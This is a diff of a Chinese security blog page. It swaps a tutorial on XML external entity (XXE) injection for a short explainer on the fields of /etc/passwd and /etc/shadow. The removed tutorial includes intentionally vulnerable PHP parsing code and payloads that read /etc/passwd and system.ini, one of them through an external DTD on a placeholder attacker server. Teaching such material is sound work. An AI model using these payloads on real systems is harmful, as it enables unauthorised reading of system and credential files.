@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>XML外部实体注入漏洞——XXE简单分析 | 未完成的歌</title>
-  <meta name="keywords" content=" xxe ">
-  <meta name="description" content="XML外部实体注入漏洞——XXE简单分析 | 未完成的歌">
+  <title>etc_passwd 与 etc_shadow文件的区别 | 未完成的歌</title>
+  <meta name="keywords" content=" liunx ">
+  <meta name="description" content="etc_passwd 与 etc_shadow文件的区别 | 未完成的歌">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="[toc] 一、基础知识1、文件包含漏洞的原理：服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码并执行，从而节省时间避免再次编写，这种调用文件的过程被称为包含。但是如果开发人员没有对包含的文件来源进行严格的审查，导致包含了其它恶意文件，执行了非预期的代码，就会引发文件包含漏洞。 2、php中的相关函数：PHP中引发文件包含漏洞的函数有以下四种： require() requ">
 <meta property="og:type" content="article">
@@ -1512,9 +1512,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-XML外部实体注入漏洞——XXE简单分析" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-etc_passwd 与 etc_shadow文件的区别" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">XML外部实体注入漏洞——XXE简单分析</h1>
+        <h1 class="article-title">etc_passwd 与 etc_shadow文件的区别</h1>
     
     <div class="article-meta">
         
@@ -1524,9 +1524,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="漏洞原理">漏洞原理</a> > 
-            
-            <a  data-rel="漏洞原理&lt;---&gt;XXE">XXE</a>
+            <a  data-rel="Liunx">Liunx</a>
             
         </span>
         
@@ -1534,19 +1532,19 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color4">xxe</a>
+            <a class="color1">liunx</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2022-01-14 23:44:40'>2021-02-01 20:33</time>
+            发布时间 : <time class="date" title='最后更新: 2022-03-23 13:10:53'>2022-03-23 12:53</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:2.9k</span>
+        <span>字数:675</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -1565,7 +1563,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81XXE-%E6%BC%8F%E6%B4%9E%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9A"><span class="toc-text">一、XXE 漏洞是什么：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81XML%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%9A"><span class="toc-text">二、XML基础知识：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81XML%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">1、XML是什么？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81XML%E6%96%87%E6%A1%A3%E7%BB%93%E6%9E%84%EF%BC%9A"><span class="toc-text">2、XML文档结构：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#DTD%E5%A3%B0%E6%98%8E%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="toc-text">DTD声明方式：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%E3%80%81%E5%86%85%E9%83%A8DTD%E5%A3%B0%E6%98%8E%EF%BC%9A"><span class="toc-text">1、内部DTD声明：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%E3%80%81%E5%A4%96%E9%83%A8DTD%E5%A3%B0%E6%98%8E%EF%BC%9A"><span class="toc-text">2、外部DTD声明：</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E4%BD%93%E7%9A%84%E5%A3%B0%E6%98%8E%EF%BC%9A"><span class="toc-text">实体的声明：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E4%BD%93%E7%9A%84%E5%88%86%E7%B1%BB%EF%BC%9A"><span class="toc-text">实体的分类：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%E3%80%81%E6%8C%89%E5%A3%B0%E6%98%8E%E4%BD%8D%E7%BD%AE%E5%88%86%EF%BC%88%E5%92%8C%E4%B8%8A%E9%9D%A2%E7%9A%84%E5%86%85%E5%A4%96%E9%83%A8%E5%BC%95%E5%85%A5-DTD%E5%A3%B0%E6%98%8E%E4%B8%8D%E5%90%8C%EF%BC%8C%E5%88%AB%E5%BC%84%E6%B7%B7%E4%BA%86%EF%BC%89%EF%BC%9A"><span class="toc-text">1、按声明位置分（和上面的内外部引入 DTD声明不同，别弄混了）：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%E3%80%81%E6%8C%89%E7%B1%BB%E5%9E%8B%E5%88%86%EF%BC%9A"><span class="toc-text">2、按类型分：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8XXE%EF%BC%9A"><span class="toc-text">三、如何利用XXE：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81XXE%E6%BC%8F%E6%B4%9E%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8D%B1%E5%AE%B3%EF%BC%9A"><span class="toc-text">四、XXE漏洞常见的危害：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%9A"><span class="toc-text">1、任意文件读取：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%9A"><span class="toc-text">2、命令执行：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B%EF%BC%9A"><span class="toc-text">3、内网探测：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E7%BD%91%E7%AB%99%EF%BC%9A"><span class="toc-text">4、攻击内网网站：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%E3%80%81%E5%8F%91%E8%B5%B7Dos%E6%94%BB%E5%87%BB%EF%BC%9A"><span class="toc-text">5、发起Dos攻击：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81XXE-%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1%EF%BC%9A"><span class="toc-text">五、XXE 如何防御：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%B8%80%E3%80%81%E4%BD%BF%E7%94%A8%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80%E6%8F%90%E4%BE%9B%E7%9A%84%E7%A6%81%E7%94%A8%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-text">方式一、使用开发语言提供的禁用外部实体的方法：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%BA%8C%E3%80%81%E8%BF%87%E6%BB%A4%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%EF%BC%9A"><span class="toc-text">方式二、过滤用户输入：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E6%9C%80%E5%90%8E"><span class="toc-text">六、最后</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B-etc-passwd-%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-text">查看 &#x2F;etc&#x2F;passwd 文件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B-etc-shadow-%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-text">查看 &#x2F;etc&#x2F;shadow 文件：</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1581,229 +1579,28 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>前言：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XXE漏洞经常出现在CTF中，一直也没有系统的学习过，今天就来总结一波。<br><div class='inner-toc'><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81XXE-%E6%BC%8F%E6%B4%9E%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9A"><span class="toc-text">一、XXE 漏洞是什么：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81XML%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%9A"><span class="toc-text">二、XML基础知识：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81XML%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">1、XML是什么？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81XML%E6%96%87%E6%A1%A3%E7%BB%93%E6%9E%84%EF%BC%9A"><span class="toc-text">2、XML文档结构：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#DTD%E5%A3%B0%E6%98%8E%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="toc-text">DTD声明方式：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%E3%80%81%E5%86%85%E9%83%A8DTD%E5%A3%B0%E6%98%8E%EF%BC%9A"><span class="toc-text">1、内部DTD声明：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%E3%80%81%E5%A4%96%E9%83%A8DTD%E5%A3%B0%E6%98%8E%EF%BC%9A"><span class="toc-text">2、外部DTD声明：</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E4%BD%93%E7%9A%84%E5%A3%B0%E6%98%8E%EF%BC%9A"><span class="toc-text">实体的声明：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E4%BD%93%E7%9A%84%E5%88%86%E7%B1%BB%EF%BC%9A"><span class="toc-text">实体的分类：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%E3%80%81%E6%8C%89%E5%A3%B0%E6%98%8E%E4%BD%8D%E7%BD%AE%E5%88%86%EF%BC%88%E5%92%8C%E4%B8%8A%E9%9D%A2%E7%9A%84%E5%86%85%E5%A4%96%E9%83%A8%E5%BC%95%E5%85%A5-DTD%E5%A3%B0%E6%98%8E%E4%B8%8D%E5%90%8C%EF%BC%8C%E5%88%AB%E5%BC%84%E6%B7%B7%E4%BA%86%EF%BC%89%EF%BC%9A"><span class="toc-text">1、按声明位置分（和上面的内外部引入 DTD声明不同，别弄混了）：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%E3%80%81%E6%8C%89%E7%B1%BB%E5%9E%8B%E5%88%86%EF%BC%9A"><span class="toc-text">2、按类型分：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8XXE%EF%BC%9A"><span class="toc-text">三、如何利用XXE：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81XXE%E6%BC%8F%E6%B4%9E%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8D%B1%E5%AE%B3%EF%BC%9A"><span class="toc-text">四、XXE漏洞常见的危害：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%9A"><span class="toc-text">1、任意文件读取：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%9A"><span class="toc-text">2、命令执行：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B%EF%BC%9A"><span class="toc-text">3、内网探测：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E7%BD%91%E7%AB%99%EF%BC%9A"><span class="toc-text">4、攻击内网网站：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%E3%80%81%E5%8F%91%E8%B5%B7Dos%E6%94%BB%E5%87%BB%EF%BC%9A"><span class="toc-text">5、发起Dos攻击：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81XXE-%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1%EF%BC%9A"><span class="toc-text">五、XXE 如何防御：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%B8%80%E3%80%81%E4%BD%BF%E7%94%A8%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80%E6%8F%90%E4%BE%9B%E7%9A%84%E7%A6%81%E7%94%A8%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-text">方式一、使用开发语言提供的禁用外部实体的方法：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%BA%8C%E3%80%81%E8%BF%87%E6%BB%A4%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%EF%BC%9A"><span class="toc-text">方式二、过滤用户输入：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E6%9C%80%E5%90%8E"><span class="toc-text">六、最后</span></a></li></ol></div></p>
-<h3 id="一、XXE-漏洞是什么："><a href="#一、XXE-漏洞是什么：" class="headerlink" title="一、XXE 漏洞是什么："></a>一、XXE 漏洞是什么：</h3><p>XXE 漏洞全称：XML External Entity Injection，即 XML 外部实体 注入漏洞。XXE 漏洞发生在应用程序解析 XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起 Dos攻击等危害。<br><img src="https://img-blog.csdnimg.cn/20201210125006380.png" alt="在这里插入图片描述"></p>
-<h3 id="二、XML基础知识："><a href="#二、XML基础知识：" class="headerlink" title="二、XML基础知识："></a>二、XML基础知识：</h3><p>想要了解 XXE漏洞，需要先了解一下关于 XML的基础知识。</p>
-<h4 id="1、XML是什么？"><a href="#1、XML是什么？" class="headerlink" title="1、XML是什么？"></a>1、XML是什么？</h4><ul>
-<li><p>XML全称：可扩展标记语言（Extensible Markup Language）。</p>
-</li>
-<li><p>XML是独立于软件和硬件的信息传输工具，它把数据从HTML中分离。 XML语言没有预定义的标签，需要作者定义自己的标签和自己的文档结构。</p>
-</li>
-<li><p>XML 被设计用来传输和存储数据，HTML 被设计用来显示数据。</p>
-</li>
-</ul>
-<h4 id="2、XML文档结构："><a href="#2、XML文档结构：" class="headerlink" title="2、XML文档结构："></a>2、XML文档结构：</h4><p>XML文档结构包括：</p>
+        <p>前言：这周面试问到了这个问题，只知道这俩文件存着用户密码，不知道有啥区别。因此来总结一下。<hr></p>
+<p>Linux系统中，所有用户（包括系统管理员）的账号和密码都可以在 /etc/passwd 和 /etc/shadow 这两个文件中找到，其中 shadow 是 passwd 的影子文件。</p>
+<p>早期 /etc/passwd 文件直接存放加密后的密码，前两位是盐值，是一个随机数，后面跟的是加密的密码。为了安全，现在的 Linux 都提供了 /etc/shadow 这个影子文件，密码放在这个文件里面，并且是只有 root 可读的，从而保证了安全。</p>
+<h4 id="查看-etc-passwd-文件："><a href="#查看-etc-passwd-文件：" class="headerlink" title="查看 /etc/passwd 文件："></a>查看 /etc/passwd 文件：</h4><p><img src="https://img-blog.csdnimg.cn/a47406dfa95b4bd8b192d715bca820c1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>/etc/passwd文件每一行的字段分别是：</p>
+<pre><code class="php">用户名:密码:用户id:组id:用户信息:主目录:shell </code></pre>
+<p>例：</p>
+<pre><code class="php">root:x:0:0:root:/root:/bin/bash</code></pre>
+<p>在利用了 shadow 文件的情况下，密码用一个 x 表示，普通用户看不到任何密码信息。影子文件保存加密的口令，/etc/passwd 文件中的密码全部变成x。</p>
+<h4 id="查看-etc-shadow-文件："><a href="#查看-etc-shadow-文件：" class="headerlink" title="查看 /etc/shadow 文件："></a>查看 /etc/shadow 文件：</h4><p><img src="https://img-blog.csdnimg.cn/05dafb943e814f26b4bb6593e5230096.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>/etc/shadow文件每一行的字段分别是：</p>
 <ol>
-<li><p> XML声明</p>
-</li>
-<li><p>DTD 文档类型定义（可选）</p>
-</li>
-<li><p>文档元素。</p>
-</li>
+<li>用户名，与 /etc/passwd 文件中的用户名相对应。</li>
+<li>加密后的密码，如果为空，则对应用户没有口令，登录时不需要口令；<code>*</code>代表帐号被锁定；<code>!</code>表示这个密码已经过期了；<br><code>$6$</code>开头的，表明是用SHA-512加密；<br><code>$1$</code>表明是用MD5加密；<br><code>$2$</code> 是用Blowfish加密；<br><code>$5$</code> 是用 SHA-256加密；</li>
+<li>上一次修改的时间(从1970年1月1日起的天数)</li>
+<li>密码不可被变更的天数：设置了这个值，则表示从变更密码的日期算起，多少天内无法再次修改密码，如果是0的话，则没有限制</li>
+<li>密码需要重新变更的天数：密码经常更换才能保证安全，为了提醒某些经常不更换密码的用户，可以设置一个天数，强制让用户更换密码，也就是说该用户的密码会在多少天后过期，如果为99999则没有限制</li>
+<li>密码过期预警天数：如果在5中设置了密码需要重新变更的天数，则会在密码过期的前多少天进行提醒，提示用户其密码将在多少天后过期</li>
+<li>密码过期的保留时间：如果在5中设置的日期过后，用户仍然没有修改密码，则该用户还可以继续使用的天数</li>
+<li>账号失效日期，过了这个日期账号就不能用了</li>
+<li>保留域</li>
 </ol>
-<p>示例代码：<br><img src="https://img-blog.csdnimg.cn/20201210135026804.png" alt="在这里插入图片描述"><br>其中 DTD (Document Type Definition）即 <strong>文档类型定义</strong> 部分 定义了XML文档的标签以及元素属性。</p>
-<p>如上图中的DTD 就定义了XML的根元素为 note，然后根元素下面有一些子元素 (to,from,heading,body)，那么下面的文档元素就可以使用这些元素：</p>
-<pre><code class="xml">&lt;!--文档元素--&gt;
-&lt;note&gt; 
-&lt;to&gt;Dave&lt;/to&gt;
-&lt;from&gt;Tom&lt;/from&gt;
-&lt;head&gt;Reminder&lt;/head&gt;
-&lt;body&gt;You are a good man&lt;/body&gt; 
-&lt;/note&gt;</code></pre>
-<p>注：</p>
-<ul>
-<li><p>PCDATA：可被解析的字符数据。PCDATA 数据类型是会被解析器解析的文本。这些文本将被解析器检查 <strong>实体</strong> 以及 <strong>标记</strong>。文本中的标签会被当作标记来处理，而实体会被展开。与之对应的是CDATA</p>
-</li>
-<li><p>CDATA：不被解析的字符数据，CDATA 数据类型是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对 待，其中的实体也不会被展开。详细可点这 <a target="_blank" rel="noopener" href="https://www.runoob.com/xml/xml-cdata.html">链接</a></p>
-</li>
-</ul>
-<h5 id="DTD声明方式："><a href="#DTD声明方式：" class="headerlink" title="DTD声明方式："></a>DTD声明方式：</h5><p>其中DTD有两种构建方式，分别为内部 DTD声明和外部 DTD声明。</p>
-<h6 id="1、内部DTD声明："><a href="#1、内部DTD声明：" class="headerlink" title="1、内部DTD声明："></a>1、内部DTD声明：</h6><p>声明格式：</p>
-<pre><code class="xml">&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></pre>
-<p>如 上例使用就是内部 DTD声明。</p>
-<h6 id="2、外部DTD声明："><a href="#2、外部DTD声明：" class="headerlink" title="2、外部DTD声明："></a>2、外部DTD声明：</h6><p>通过引入 dtd文件的方式进行声明（这一点和 css，javascript 很像）。</p>
-<p> 声明格式：</p>
-<pre><code class="xml">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code></pre>
 <p>例：</p>
-<pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;
- &lt;!DOCTYPE note SYSTEM &quot;test.dtd&quot;&gt; 
- &lt;note&gt; 
- &lt;to&gt;H&lt;/to&gt;
- &lt;from&gt;E&lt;/from&gt;
- &lt;head&gt;L&lt;/head&gt;
- &lt;body&gt;LO&lt;/body&gt; 
- &lt;/note&gt;</code></pre>
-<p>test.dtd：</p>
-<pre><code class="xml">&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;
-&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;
-&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt; 
-&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;</code></pre>
-<p>🆗，说完了 DTD的两种引入方式，终于到了关键人物：” 实体 “ 登场了。 </p>
-<h5 id="实体的声明："><a href="#实体的声明：" class="headerlink" title="实体的声明："></a>实体的声明：</h5><p>实体定义在 DTD声明中，</p>
-<p>例：</p>
-<pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE sss [
-&lt;!ELEMENT sss ANY &gt;
-&lt;!ENTITY xxe &quot;hello&quot; &gt;
-]&gt;</code></pre>
-<p>这里定义元素为 ANY 表示可以接受任何元素作为标签，这里的 <code>&quot;xxe&quot;</code> 就是我们所说的实体了（相当于一个变量），可以在XML文档元素中使用 <code>&amp;</code> 符号对实体进行引用。</p>
-<p>例：</p>
-<pre><code class="xml">&lt;sss&gt;
-&lt;user&gt;&amp;xxe;&lt;/user&gt;
-&lt;pass&gt;pass&lt;/pass&gt;
-&lt;/sss&gt;</code></pre>
-<p>到时候输出的时候 <code>&amp;xxe;</code> 就会被 <code>hello</code> 替换。</p>
-<h5 id="实体的分类："><a href="#实体的分类：" class="headerlink" title="实体的分类："></a>实体的分类：</h5><h6 id="1、按声明位置分（和上面的内外部引入-DTD声明不同，别弄混了）："><a href="#1、按声明位置分（和上面的内外部引入-DTD声明不同，别弄混了）：" class="headerlink" title="1、按声明位置分（和上面的内外部引入 DTD声明不同，别弄混了）："></a>1、按声明位置分（和上面的内外部引入 DTD声明不同，别弄混了）：</h6><p>实体是定义在 DTD中的，可分为 <strong>外部实体</strong> 和 <strong>内部实体</strong>，上面的例子就是内部实体，外部实体就是把实体定义在外部文件中。</p>
-<p>例：</p>
-<pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE sss [
-&lt;!ELEMENT sss ANY &gt;
-&lt;!ENTITY xxe SYSTEM &quot;file:///D:/test.dtd&quot; &gt; //引入外部dtd文件
-]&gt;
-&lt;sss&gt;
-    &lt;user&gt;&amp;xxe;&lt;/user&gt;
-    &lt;pass&gt;pass&lt;/pass&gt;
-&lt;/sss&gt;</code></pre>
-<p>这样当需要更改实体的值时，只需要更改外部的 dtd 文件就行，不需要打开源码更改了（降低了耦合性），但也带来了安全漏洞。</p>
-<p>外部实体支持http、file等协议。不同程序支持的协议不同：<br><img src="https://img-blog.csdnimg.cn/20201210161421770.png" alt="在这里插入图片描述"></p>
-<h6 id="2、按类型分："><a href="#2、按类型分：" class="headerlink" title="2、按类型分："></a>2、按类型分：</h6><p>实体又分为通用实体和参数实体。</p>
-<p><strong>1、通用实体</strong>：</p>
-<ul>
-<li>用 <code>&amp;实体名;</code>引用，在DTD 中定义（内外DTD都行），在 XML文档元素中引用。</li>
-</ul>
-<p>上面的例子都是通用实体。</p>
-<p><strong>2、参数实体</strong>：</p>
-<ul>
-<li><p>使用 <code>% 实体名</code>(中间有空格) 在DTD中定义（内外DTD都行），并且只能在DTD中使用 <code>%实体名;</code> 引用。</p>
-</li>
-<li><p>在 DTD 文件中，参数实体的声明可以引用其他实体（参数实体和通用实体）。</p>
-</li>
-</ul>
-<p>引入格式：</p>
-<p><strong>内部引入</strong>：</p>
-<pre><code class="xml">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</code></pre>
-<p>例：</p>
-<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;&gt;
-&lt;!DOCTYPE Author [
-&lt;!ENTITY % first &quot;Hello&quot;&gt;
-&lt;!ENTITY % second &quot;%first;_World&quot;&gt;
-%second;]&gt;</code></pre>
-<p><code>%second;</code> 会解析为：Hello_World </p>
-<p><strong>外部引入</strong>：</p>
-<pre><code class="xml">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</code></pre>
-<p>例：</p>
-<pre><code class="xml">&lt;!DOCTYPE a [
-&lt;!ENTITY % name SYSTEM &quot;file:///D:/test.dtd&quot;&gt;
-%name;]&gt;</code></pre>
-<h3 id="三、如何利用XXE："><a href="#三、如何利用XXE：" class="headerlink" title="三、如何利用XXE："></a>三、如何利用XXE：</h3><p>说了这么多，终于来到了重点，正如标题 XXE名为 “<strong>外部实体注入</strong>”，也就是说时是通过引入外部实体的方式进行注入的。</p>
-<p>我们先来看这个例子：</p>
-<pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE s [
-&lt;!ELEMENT s ANY &gt;
-&lt;!ENTITY xxe SYSTEM &quot;file:///D:/test.dtd&quot; &gt; 
-]&gt;
-&lt;s&gt;
-    &lt;user&gt;&amp;xxe;&lt;/user&gt;
-    &lt;pass&gt;pass&lt;/pass&gt;
-&lt;/s&gt;</code></pre>
-<p>既然能读 dtd文件，那是不是将路径换成敏感文件的路径，也能把敏感文件读出来？</p>
-<p>例：</p>
-<p>解析 xml 的php文件：</p>
-<p>test.php:</p>
-<pre><code class="php">&lt;?php
-    libxml_disable_entity_loader (false);
-    $xmlfile = file_get_contents(&#39;php://input&#39;);
-    $dom = new DOMDocument();
-    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
-    $creds = simplexml_import_dom($dom);
-    echo $creds;
-?&gt;</code></pre>
-<p>构造payload:</p>
-<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
-&lt;!DOCTYPE A [  
-&lt;!ENTITY a SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; 
-&lt;A&gt;&amp;a;&lt;/A&gt;</code></pre>
-<p><img src="https://img-blog.csdnimg.cn/2020121219041855.png" alt="在这里插入图片描述">可以看到，成功读取到了 C盘下的 <code>system.ini</code> 文件，此漏洞就是 <strong>任意文件漏洞</strong>。</p>
-<h3 id="四、XXE漏洞常见的危害："><a href="#四、XXE漏洞常见的危害：" class="headerlink" title="四、XXE漏洞常见的危害："></a>四、XXE漏洞常见的危害：</h3><h4 id="1、任意文件读取："><a href="#1、任意文件读取：" class="headerlink" title="1、任意文件读取："></a>1、任意文件读取：</h4><p>构造任意文件读取漏洞 playload 有下面几种方法：</p>
-<p><strong>方式一、直接通过外部实体声明</strong>：</p>
-<p>XML内容：</p>
-<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
-&lt;!DOCTYPE a [  
-&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; 
-&lt;a&gt;&amp;b;&lt;/a&gt;</code></pre>
-<p>上面的例子就是此方式，这是最简单的XXE漏洞利用。</p>
-<p> <strong>方式二、外部实体声明 （通用实体）+ 外部 DTD文件</strong>：</p>
-<p>XML内容：</p>
-<pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE a SYSTEM &quot;http://XXX/test.dtd&quot;&gt;
-&lt;c&gt;&amp;b;&lt;/c&gt;</code></pre>
-<blockquote>
-<p>注意：这里的 <a target="_blank" rel="noopener" href="http://xxx/test.dtd">http://XXX/test.dtd</a> 是攻击者自己服务器上的文件。</p>
-</blockquote>
-<p>test.dtd 内容：</p>
-<pre><code class="php">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></pre>
-<p>示例(使用的是 xxe-labs 靶场的php环境)：<br><img src="https://img-blog.csdnimg.cn/20201212202148819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>因为这里使用windows演示的，所以读取的是 <code>system.ini</code> 文件，可以看到成功的读取到了。</p>
-<p> <strong>方式三、外部实体声明（参数实体） + 引入外部实体声明</strong>：</p>
